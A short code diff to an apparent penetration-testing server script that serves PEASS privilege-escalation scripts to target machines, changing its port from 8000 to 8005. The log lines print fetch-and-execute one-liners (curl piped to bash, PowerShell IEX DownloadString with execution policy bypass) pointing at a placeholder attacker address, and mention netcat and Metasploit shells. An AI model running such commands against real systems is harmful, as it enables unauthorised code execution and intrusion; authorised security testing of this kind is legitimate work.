@@ -337,8 +337,8 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1')\"")
+    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8005/get-script | bash")
+    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8005/get-script.ps1')\"")
     log("")
     log(f"⚠️  Windows Shell Compatibility:")
     log(f"   ✅ BEST: nc.exe CMD shells (full output visibility)")
@@ -346,5 +346,5 @@ if __name__ == '__main__':
     log(f"   ✅ WORKS: Metasploit, Interactive PowerShell/CMD\n")
     log(f"[*] Waiting for connections...\n")
     
-    # Run on all interfaces, port 8000
-    app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
+    # Run on all interfaces, port 8005
+    app.run(host='0.0.0.0', port=8005, debug=False, threaded=True)
